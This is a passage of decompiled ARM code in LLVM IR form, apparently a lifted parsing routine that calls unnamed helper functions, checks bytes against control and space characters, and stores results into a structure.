  store i1 %v7_8f2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f30 = add i32 %v2_8f28, -20736
  store i32 %v1_8f30, i32* %r3.global-to-local, align 4
  %v7_8f34 = icmp sgt i32 %v5_8f10, 1
  br i1 %v7_8f34, label %bb213, label %bb214

bb213:                                            ; preds = %dec_label_pc_8f20
  %v9_8f34 = add i32 %v5_8f10, -2
  store i32 %v9_8f34, i32* %r2.global-to-local, align 4
  br label %bb214

bb214:                                            ; preds = %dec_label_pc_8f20, %bb213
  %v3_8f3c = phi i32 [ %v5_8f10, %dec_label_pc_8f20 ], [ %v9_8f34, %bb213 ]
  %v1_8f38 = add i32 %v2_8f28, -20773
  store i32 %v1_8f38, i32* %r3.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r5, align 4
  %v1_8f3c = trunc i32 %v0_8f3c to i8
  %v4_8f3c = add i32 %v3_8f3c, %v1_8f38
  %v5_8f3c = inttoptr i32 %v4_8f3c to i8*
  store i8 %v1_8f3c, i8* %v5_8f3c, align 1
  %v0_8f40 = load i32, i32* @r6, align 4
  store i32 %v0_8f40, i32* %r0.global-to-local, align 4
  %v1_8f44 = inttoptr i32 %v0_8f40 to i8*
  %v2_8f44 = call i32 @function_12cdc(i8* %v1_8f44)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 %v2_8f44, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_8f54 = inttoptr i32 %v0_8f48 to i32*
  %v3_8f54 = call i32 @function_122cc(i32 43, i32* %v2_8f54)
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* @r1, align 4
  store i32 %v3_8f54, i32* %r2.global-to-local, align 4
  %v0_8f60 = load i32, i32* @r6, align 4
  store i32 %v0_8f60, i32* %r0.global-to-local, align 4
  %v3_8f64 = inttoptr i32 %v0_8f60 to i8*
  %v4_8f64 = call i32 @function_13030(i8* %v3_8f64, i32 %v0_8f58, i32 %v3_8f54)
  store i32 %v4_8f64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8f68 = icmp slt i32 %v4_8f64, 0
  store i1 %v1_8f68, i1* %cpsr_n.global-to-local, align 1
  %v2_8f68 = icmp eq i32 %v4_8f64, 0
  store i1 %v2_8f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f68, label %.thread47, label %bb215

bb215:                                            ; preds = %bb214
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8f70 = load i32, i32* @r8, align 4
  %v3_8f70 = inttoptr i32 %v2_8f70 to i32*
  store i32 1, i32* %v3_8f70, align 4
  br label %.thread47

.thread47:                                        ; preds = %bb214, %dec_label_pc_8ec0, %.thread46, %bb215
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = add i32 %v1_8f80, 4
  %v3_8f80 = inttoptr i32 %v2_8f80 to i32*
  store i32 0, i32* %v3_8f80, align 4
  %v3_8f84 = call i32 @function_122cc(i32 41, i32* null)
  %v0_8f88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8f88, i32* @r1, align 4
  store i32 %v3_8f84, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8f94 = call i32 @function_13030(i8* %tmp199, i32 %v0_8f88, i32 %v3_8f84)
  store i32 %v4_8f94, i32* %r0.global-to-local, align 4
  %v1_8f9c = add i32 %v4_8f94, 1
  %v2_8f9c = icmp eq i32 %v4_8f94, -1
  store i1 %v2_8f9c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f9c = sub i32 0, %v4_8f94
  %v4_8f9c = and i32 %v1_8f9c, %v3_8f9c
  %v5_8f9c = icmp slt i32 %v4_8f9c, 0
  store i1 %v5_8f9c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f9c = icmp slt i32 %v1_8f9c, 0
  store i1 %v6_8f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_8f9c = icmp eq i32 %v1_8f9c, 0
  store i1 %v7_8f9c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_8f9c, label %.thread48, label %dec_label_pc_8fa8

dec_label_pc_8fa8:                                ; preds = %.thread47
  %v0_8fa8 = load i32, i32* @r6, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_8fb0 = inttoptr i32 %v0_8fa8 to i32*
  %v3_8fb0 = call i32 @function_122cc(i32 41, i32* %v2_8fb0)
  %v0_8fb4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8fb4, i32* @r1, align 4
  store i32 %v3_8fb0, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8fc0 = call i32 @function_13030(i8* %tmp199, i32 %v0_8fb4, i32 %v3_8fb0)
  store i32 %v4_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8fcc = add i32 %v4_8fc0, %v2_8748
  store i32 %v2_8fcc, i32* %r3.global-to-local, align 4
  %v1_8fd0 = load i32, i32* @r5, align 4
  %v2_8fd0 = add i32 %v1_8fd0, %v2_8fcc
  %v3_8fd0 = inttoptr i32 %v2_8fd0 to i8*
  %v4_8fd0 = load i8, i8* %v3_8fd0, align 1
  %v2_8fd8 = icmp ugt i8 %v4_8fd0, 31
  store i1 %v2_8fd8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8fd8 = icmp ult i8 %v4_8fd0, 32
  store i1 %v6_8fd8, i1* %cpsr_n.global-to-local, align 1
  %v7_8fd8 = icmp eq i8 %v4_8fd0, 32
  store i1 %v7_8fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_8fe0 = zext i1 %v7_8fd8 to i32
  %v2_8fe0.v4_8fc0 = add i32 %v2_8fe0, %v4_8fc0
  store i32 %v2_8fe0.v4_8fc0, i32* @r4, align 4
  %v2_8fe4 = add i32 %v2_8fe0.v4_8fc0, %v2_8280
  store i32 %v2_8fe4, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8fe4, i32* %r0.global-to-local, align 4
  %v1_8ff0 = load i32, i32* %fp.global-to-local, align 4
  %v2_8ff0 = sub i32 %v1_8ff0, %v2_8fe0.v4_8fc0
  store i32 %v2_8ff0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ff8 = call i32 @function_12da0(i32 %v2_8fe4, i32 %v2_8ff0, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_8ff8, i32* %r0.global-to-local, align 4
  %v1_8ffc = add i32 %v5_8ff8, 1
  %v2_8ffc = icmp eq i32 %v5_8ff8, -1
  store i1 %v2_8ffc, i1* %cpsr_c.global-to-local, align 1
  %v3_8ffc = sub i32 0, %v5_8ff8
  %v4_8ffc = and i32 %v1_8ffc, %v3_8ffc
  %v5_8ffc = icmp slt i32 %v4_8ffc, 0
  store i1 %v5_8ffc, i1* %cpsr_v.global-to-local, align 1
  %v6_8ffc = icmp slt i32 %v1_8ffc, 0
  store i1 %v6_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v7_8ffc = icmp eq i32 %v1_8ffc, 0
  store i1 %v7_8ffc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_8ff8, i32* %r2.global-to-local, align 4
  br i1 %v7_8ffc, label %.thread48, label %dec_label_pc_9008

dec_label_pc_9008:                                ; preds = %dec_label_pc_8fa8
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_9010 = load i32, i32* @r4, align 4
  %v2_9010 = add i32 %v1_9010, %v2_8748
  %v1_9014 = add i32 %v5_8ff8, -1
  %v2_9014 = icmp ne i32 %v5_8ff8, 0
  store i1 %v2_9014, i1* %cpsr_c.global-to-local, align 1
  %v3_9014 = sub i32 0, %v5_8ff8
  %v4_9014 = and i32 %v5_8ff8, %v3_9014
  %v5_9014 = icmp slt i32 %v4_9014, 0
  store i1 %v5_9014, i1* %cpsr_v.global-to-local, align 1
  %v6_9014 = icmp slt i32 %v1_9014, 0
  store i1 %v6_9014, i1* %cpsr_n.global-to-local, align 1
  %v7_9014 = icmp eq i32 %v5_8ff8, 1
  store i1 %v7_9014, i1* %cpsr_z.global-to-local, align 1
  %v1_9018 = add i32 %v2_9010, -20736
  store i32 %v1_9018, i32* %r3.global-to-local, align 4
  %v7_901c = icmp sgt i32 %v5_8ff8, 1
  br i1 %v7_901c, label %bb216, label %bb217

bb216:                                            ; preds = %dec_label_pc_9008
  %v9_901c = add i32 %v5_8ff8, -2
  store i32 %v9_901c, i32* %r2.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %dec_label_pc_9008, %bb216
  %v3_9024 = phi i32 [ %v5_8ff8, %dec_label_pc_9008 ], [ %v9_901c, %bb216 ]
  %v1_9020 = add i32 %v2_9010, -20773
  store i32 %v1_9020, i32* %r3.global-to-local, align 4
  %v0_9024 = load i32, i32* @r6, align 4
  %v1_9024 = trunc i32 %v0_9024 to i8
  %v4_9024 = add i32 %v3_9024, %v1_9020
  %v5_9024 = inttoptr i32 %v4_9024 to i8*
  store i8 %v1_9024, i8* %v5_9024, align 1
  %v0_9028 = load i32, i32* @r5, align 4
  store i32 %v0_9028, i32* %r0.global-to-local, align 4
  %v1_902c = inttoptr i32 %v0_9028 to i8*
  %v2_902c = call i32 @function_12cdc(i8* %v1_902c)
  %v0_9030 = load i32, i32* @r6, align 4
  store i32 %v0_9030, i32* %r1.global-to-local, align 4
  store i32 %v2_902c, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_903c = inttoptr i32 %v0_9030 to i32*
  %v3_903c = call i32 @function_122cc(i32 42, i32* %v2_903c)
  %v0_9040 = load i32, i32* @r4, align 4
  store i32 %v0_9040, i32* @r1, align 4
  store i32 %v3_903c, i32* %r2.global-to-local, align 4
  %v0_9048 = load i32, i32* @r5, align 4
  store i32 %v0_9048, i32* %r0.global-to-local, align 4
  %v3_904c = inttoptr i32 %v0_9048 to i8*
  %v4_904c = call i32 @function_13030(i8* %v3_904c, i32 %v0_9040, i32 %v3_903c)
  store i32 %v4_904c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9050 = icmp slt i32 %v4_904c, 0
  store i1 %v1_9050, i1* %cpsr_n.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_904c, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9050, label %.thread48, label %bb218

bb218:                                            ; preds = %bb217
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9058 = load i32, i32* @r8, align 4
  %v3_9058 = add i32 %v2_9058, 4
  %v4_9058 = inttoptr i32 %v3_9058 to i32*
  store i32 1, i32* %v4_9058, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb217, %dec_label_pc_8fa8, %.thread47, %bb218
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9064 = call i32 @function_122cc(i32 40, i32* null)
  %v0_9068 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9068, i32* @r1, align 4
  store i32 %v3_9064, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9074 = call i32 @function_13030(i8* %tmp199, i32 %v0_9068, i32 %v3_9064)
  store i32 %v4_9074, i32* %r0.global-to-local, align 4
  %v1_9078 = add i32 %v4_9074, 1
  %v2_9078 = icmp eq i32 %v4_9074, -1
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub i32 0, %v4_9074
  %v4_9078 = and i32 %v1_9078, %v3_9078
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp slt i32 %v1_9078, 0
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9078, 0
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9078, label %.thread, label %dec_label_pc_9090

.thread:                                          ; preds = %.thread48
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9088 = load i32, i32* @r8, align 4
  %v3_9088 = add i32 %v2_9088, 8
  %v4_9088 = inttoptr i32 %v3_9088 to i32*
  store i32 0, i32* %v4_9088, align 4
  br label %dec_label_pc_9124

dec_label_pc_9090:                                ; preds = %.thread48
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9098 = call i32 @function_122cc(i32 40, i32* null)
  %v0_909c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_909c, i32* @r1, align 4
  store i32 %v3_9098, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_90a8 = call i32 @function_13030(i8* %tmp199, i32 %v0_909c, i32 %v3_9098)
  store i32 %v4_90a8, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_90b4 = add i32 %v4_90a8, %v2_8748
  store i32 %v2_90b4, i32* %r3.global-to-local, align 4
  %v1_90b8 = load i32, i32* @r5, align 4
  %v2_90b8 = add i32 %v1_90b8, %v2_90b4
  %v3_90b8 = inttoptr i32 %v2_90b8 to i8*
  %v4_90b8 = load i8, i8* %v3_90b8, align 1
  %v2_90c0 = icmp ugt i8 %v4_90b8, 31
  store i1 %v2_90c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_90c0 = icmp ult i8 %v4_90b8, 32
  store i1 %v6_90c0, i1* %cpsr_n.global-to-local, align 1
  %v7_90c0 = icmp eq i8 %v4_90b8, 32
  store i1 %v7_90c0, i1* %cpsr_z.global-to-local, align 1
  %v2_90c8 = zext i1 %v7_90c0 to i32
  %v2_90c8.v4_90a8 = add i32 %v2_90c8, %v4_90a8
  store i32 %v2_90c8.v4_90a8, i32* @r4, align 4
  %v2_90cc = add i32 %v2_90c8.v4_90a8, %v2_8280
  store i32 %v2_90cc, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_90cc, i32* %r0.global-to-local, align 4
  %v1_90d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_90d8 = sub i32 %v1_90d8, %v2_90c8.v4_90a8
  store i32 %v2_90d8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_90e0 = call i32 @function_12da0(i32 %v2_90cc, i32 %v2_90d8, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_90e0, i32* %r0.global-to-local, align 4
  %v1_90e4 = add i32 %v5_90e0, 1
  %v2_90e4 = icmp eq i32 %v5_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v3_90e4 = sub i32 0, %v5_90e0
  %v4_90e4 = and i32 %v1_90e4, %v3_90e4
  %v5_90e4 = icmp slt i32 %v4_90e4, 0
  store i1 %v5_90e4, i1* %cpsr_v.global-to-local, align 1
  %v6_90e4 = icmp slt i32 %v1_90e4, 0
  store i1 %v6_90e4, i1* %cpsr_n.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v1_90e4, 0
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_90e0, i32* %r2.global-to-local, align 4
  br i1 %v7_90e4, label %dec_label_pc_9124, label %dec_label_pc_90f0

dec_label_pc_90f0:                                ; preds = %dec_label_pc_9090
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_90f8 = load i32, i32* @r4, align 4
  %v2_90f8 = add i32 %v1_90f8, %v2_8748
  %v1_90fc = add i32 %v5_90e0, -1
  %v2_90fc = icmp ne i32 %v5_90e0, 0
  store i1 %v2_90fc, i1* %cpsr_c.global-to-local, align 1
  %v3_90fc = sub i32 0, %v5_90e0
  %v4_90fc = and i32 %v5_90e0, %v3_90fc
  %v5_90fc = icmp slt i32 %v4_90fc, 0
  store i1 %v5_90fc, i1* %cpsr_v.global-to-local, align 1
  %v6_90fc = icmp slt i32 %v1_90fc, 0
  store i1 %v6_90fc, i1* %cpsr_n.global-to-local, align 1
  %v7_90fc = icmp eq i32 %v5_90e0, 1
  store i1 %v7_90fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9100 = add i32 %v2_90f8, -20736
  store i32 %v1_9100, i32* %r3.global-to-local, align 4
  %v7_9104 = icmp sgt i32 %v5_90e0, 1
  br i1 %v7_9104, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_90f0
  %v9_9104 = add i32 %v5_90e0, -2
  store i32 %v9_9104, i32* %r2.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_90f0, %bb219
  %v3_9118 = phi i32 [ %v5_90e0, %dec_label_pc_90f0 ], [ %v9_9104, %bb219 ]
  %v1_9108 = add i32 %v2_90f8, -20773
  store i32 %v1_9108, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_9110 = load i32, i32* @r5, align 4
  store i32 %v0_9110, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9118 = add i32 %v3_9118, %v1_9108
  %v5_9118 = inttoptr i32 %v4_9118 to i8*
  store i8 0, i8* %v5_9118, align 1
  %v2_911c = inttoptr i32 %v0_9110 to i8*
  %v3_911c = call i32 @function_12e08(i8* %v2_911c, i32 10)
  store i32 %v3_911c, i32* %r0.global-to-local, align 4
  %v1_9120 = load i32, i32* @r8, align 4
  %v2_9120 = add i32 %v1_9120, 8
  %v3_9120 = inttoptr i32 %v2_9120 to i32*
  store i32 %v3_911c, i32* %v3_9120, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %.thread, %dec_label_pc_9090, %bb220
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9128:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_927c, %dec_label_pc_9124
  %v1_9134 = phi i32 [ 0, %dec_label_pc_9124 ], [ %v0_927c, %dec_label_pc_927c ], [ %v1_9134.pre.pre, %dec_label_pc_92fc ]
  store i32 %v2_8280, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9134 = add i32 %v1_9134, %v2_8280
  store i32 %v2_9134, i32* @r4, align 4
  %v3_9138 = call i32 @function_122cc(i32 39, i32* null)
  %v0_913c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_913c, i32* @r1, align 4
  store i32 %v3_9138, i32* %r2.global-to-local, align 4
  %v0_9144 = load i32, i32* @r4, align 4
  store i32 %v0_9144, i32* %r0.global-to-local, align 4
  %v3_9148 = inttoptr i32 %v0_9144 to i8*
  %v4_9148 = call i32 @function_13030(i8* %v3_9148, i32 %v0_913c, i32 %v3_9138)
  store i32 %v4_9148, i32* %r0.global-to-local, align 4
  %v1_9150 = add i32 %v4_9148, 1
  %v2_9150 = icmp eq i32 %v4_9148, -1
  store i1 %v2_9150, i1* %cpsr_c.global-to-local, align 1
  %v3_9150 = sub i32 0, %v4_9148
  %v4_9150 = and i32 %v1_9150, %v3_9150
  %v5_9150 = icmp slt i32 %v4_9150, 0
  store i1 %v5_9150, i1* %cpsr_v.global-to-local, align 1
  %v6_9150 = icmp slt i32 %v1_9150, 0
  store i1 %v6_9150, i1* %cpsr_n.global-to-local, align 1
  %v7_9150 = icmp eq i32 %v1_9150, 0
  store i1 %v7_9150, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9150, label %dec_label_pc_9328, label %dec_label_pc_915c

dec_label_pc_915c:                                ; preds = %dec_label_pc_9128
  %v0_915c = load i32, i32* @r8, align 4
  %v1_915c = add i32 %v0_915c, 12
  %v2_915c = inttoptr i32 %v1_915c to i32*
  %v3_915c = load i32, i32* %v2_915c, align 4
  store i32 %v3_915c, i32* %r3.global-to-local, align 4
  %v1_9160 = add i32 %v3_915c, -4
  %v2_9160 = icmp ugt i32 %v3_915c, 3
  store i1 %v2_9160, i1* %cpsr_c.global-to-local, align 1
  %v3_9160 = sub i32 3, %v3_915c
  %v4_9160 = and i32 %v3_9160, %v3_915c
  %v5_9160 = icmp slt i32 %v4_9160, 0
  store i1 %v5_9160, i1* %cpsr_v.global-to-local, align 1
  %v6_9160 = icmp slt i32 %v1_9160, 0
  store i1 %v6_9160, i1* %cpsr_n.global-to-local, align 1
  %v7_9160 = icmp eq i32 %v3_915c, 4
  store i1 %v7_9160, i1* %cpsr_z.global-to-local, align 1
  %v8_9164 = icmp sgt i32 %v3_915c, 4
  br i1 %v8_9164, label %dec_label_pc_9328, label %dec_label_pc_9168

dec_label_pc_9168:                                ; preds = %dec_label_pc_915c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9170 = call i32 @function_122cc(i32 39, i32* null)
  %v0_9174 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9174, i32* @r1, align 4
  store i32 %v3_9170, i32* %r2.global-to-local, align 4
  %v0_917c = load i32, i32* @r4, align 4
  store i32 %v0_917c, i32* %r0.global-to-local, align 4
  %v3_9180 = inttoptr i32 %v0_917c to i8*
  %v4_9180 = call i32 @function_13030(i8* %v3_9180, i32 %v0_9174, i32 %v3_9170)
  store i32 %v4_9180, i32* %r0.global-to-local, align 4
  %v0_9188 = load i32, i32* @r5, align 4
  %v2_9188 = add i32 %v0_9188, %v4_9180
  store i32 %v2_9188, i32* @sl, align 4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v2_9190 = add i32 %v2_9188, %v2_8748
  store i32 %v2_9190, i32* %r3.global-to-local, align 4
  %v1_9194 = load i32, i32* @r6, align 4
  %v2_9194 = add i32 %v1_9194, %v2_9190
  %v3_9194 = inttoptr i32 %v2_9194 to i8*
  %v4_9194 = load i8, i8* %v3_9194, align 1
  %v6_9194 = zext i8 %v4_9194 to i32
  store i32 %v6_9194, i32* %r2.global-to-local, align 4
  %v2_9198 = icmp ugt i8 %v4_9194, 31
  store i1 %v2_9198, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9198 = icmp ult i8 %v4_9194, 32
  store i1 %v6_9198, i1* %cpsr_n.global-to-local, align 1
  %v7_9198 = icmp eq i8 %v4_9194, 32
  store i1 %v7_9198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9198, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_9168
  %v2_919c = add i32 %v4_9180, 1
  store i32 %v2_919c, i32* %r0.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_9168, %bb221
  %v2_91ac = phi i32 [ %v4_9180, %dec_label_pc_9168 ], [ %v2_919c, %bb221 ]
  %v1_91a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_91a0 = sub i32 %v1_91a0, %v0_9188
  store i32 %v2_91a0, i32* %r3.global-to-local, align 4
  %v2_91a4 = sub i32 %v2_91a0, %v2_91ac
  store i32 %v2_91a4, i32* @r7, align 4
  %v0_91a8 = load i32, i32* @r4, align 4
  %v2_91a8 = add i32 %v0_91a8, %v2_91ac
  store i32 %v2_91a8, i32* @r6, align 4
  br i1 %v7_9198, label %bb223, label %bb224

bb223:                                            ; preds = %bb222
  %v3_91ac = add i32 %v2_91ac, %v0_9188
  store i32 %v3_91ac, i32* @sl, align 4
  br label %bb224

bb224:                                            ; preds = %bb222, %bb223
  store i32 %v2_91a4, i32* %r1.global-to-local, align 4
  store i32 %v2_91a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_91c0 = call i32 @function_12da0(i32 %v2_91a8, i32 %v2_91a4, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_91c0, i32* %r0.global-to-local, align 4
  %v1_91c4 = add i32 %v5_91c0, 1
  %v2_91c4 = icmp eq i32 %v5_91c0, -1
  store i1 %v2_91c4, i1* %cpsr_c.global-to-local, align 1
  %v3_91c4 = sub i32 0, %v5_91c0
  %v4_91c4 = and i32 %v1_91c4, %v3_91c4
  %v5_91c4 = icmp slt i32 %v4_91c4, 0
  store i1 %v5_91c4, i1* %cpsr_v.global-to-local, align 1
  %v6_91c4 = icmp slt i32 %v1_91c4, 0
  store i1 %v6_91c4, i1* %cpsr_n.global-to-local, align 1
  %v7_91c4 = icmp eq i32 %v1_91c4, 0
  store i1 %v7_91c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_91c0, i32* @r4, align 4
  br i1 %v7_91c4, label %dec_label_pc_927c, label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %bb224
  store i32 %v2_8280, i32* %r2.global-to-local, align 4
  %v1_91d4 = add i32 %v5_91c0, -1
  %v2_91d4 = icmp ne i32 %v5_91c0, 0
  store i1 %v2_91d4, i1* %cpsr_c.global-to-local, align 1
  %v3_91d4 = sub i32 0, %v5_91c0
  %v4_91d4 = and i32 %v5_91c0, %v3_91d4
  %v5_91d4 = icmp slt i32 %v4_91d4, 0
  store i1 %v5_91d4, i1* %cpsr_v.global-to-local, align 1
  %v6_91d4 = icmp slt i32 %v1_91d4, 0
  store i1 %v6_91d4, i1* %cpsr_n.global-to-local, align 1
  %v7_91d4 = icmp eq i32 %v5_91c0, 1
  store i1 %v7_91d4, i1* %cpsr_z.global-to-local, align 1
  %v7_91d8 = icmp slt i32 %v5_91c0, 2
  br i1 %v7_91d8, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_91d0
  %v9_91d8 = add i32 %v5_91c0, -2
  store i32 %v9_91d8, i32* @r4, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_91d0, %bb225
  %v1_91dc = load i32, i32* @sl, align 4
  %v2_91dc = add i32 %v1_91dc, %v2_8280
  store i32 %v2_91dc, i32* @r5, align 4
  %v0_91e0 = load i32, i32* @r6, align 4
  store i32 %v0_91e0, i32* %r0.global-to-local, align 4
  %v0_91e4 = load i32, i32* @r7, align 4
  store i32 %v0_91e4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_91f0 = call i32 @function_12da0(i32 %v0_91e0, i32 %v0_91e4, i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32 1)
  store i32 %v4_91f0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_91f4 = icmp slt i32 %v4_91f0, 0
  store i1 %v1_91f4, i1* %cpsr_n.global-to-local, align 1
  %v2_91f4 = icmp eq i32 %v4_91f0, 0
  store i1 %v2_91f4, i1* %cpsr_z.global-to-local, align 1
  %tmp227 = icmp slt i32 %v4_91f0, 1
  br i1 %tmp227, label %.dec_label_pc_9214_crit_edge, label %dec_label_pc_91fc

.dec_label_pc_9214_crit_edge:                     ; preds = %bb226
  %v1_921c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9214

dec_label_pc_91fc:                                ; preds = %bb226
  %v0_91fc = load i32, i32* @r6, align 4
  store i32 %v0_91fc, i32* %r0.global-to-local, align 4
  %v0_9200 = load i32, i32* @r7, align 4
  store i32 %v0_9200, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_920c = call i32 @function_12da0(i32 %v0_91fc, i32 %v0_9200, i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32 1)
  store i32 %v4_920c, i32* %r0.global-to-local, align 4
  %v1_9210 = add i32 %v4_920c, -1
  store i32 %v1_9210, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %.dec_label_pc_9214_crit_edge, %dec_label_pc_91fc
  %v1_921c = phi i32 [ %v1_921c.pre, %.dec_label_pc_9214_crit_edge ], [ %v1_9210, %dec_label_pc_91fc ]
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_9224 = add i32 %v2_921c, %v1_921c
  store i32 %v1_9224, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9234 = load i32, i32* @sl, align 4
  %v4_9234 = add i32 %v3_9234, %v1_9224
  %v5_9234 = inttoptr i32 %v4_9234 to i8*
  store i8 0, i8* %v5_9234, align 1
  %storemerge4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9254.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9254

dec_label_pc_9240:                                ; preds = %dec_label_pc_9254
